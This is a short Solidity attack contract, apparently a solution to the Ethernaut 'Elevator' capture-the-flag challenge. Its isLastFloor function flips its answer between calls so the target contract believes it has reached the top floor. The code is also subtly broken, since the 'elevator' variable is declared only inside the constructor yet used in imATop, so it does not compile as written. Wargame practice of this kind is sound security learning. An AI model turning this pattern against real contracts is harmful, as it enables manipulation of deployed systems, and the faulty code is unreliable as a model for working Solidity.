//SPDX-License-Identifier: None
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint _floor) external;
}

contract Building {
    bool flip;
    constructor(address $your_ethernaut_address_here) {
        Elevator elevator = Elevator($your_ethernaut_address_here);
        flip = true;
    }

    function imATop() public {
        elevator.goTo(69);
    }

    function isLastFloor(uint _floor) public returns (bool) {
        if (flip) {
            flip = false;
        } else {
            flip = true;
        }
        return flip;
    }
}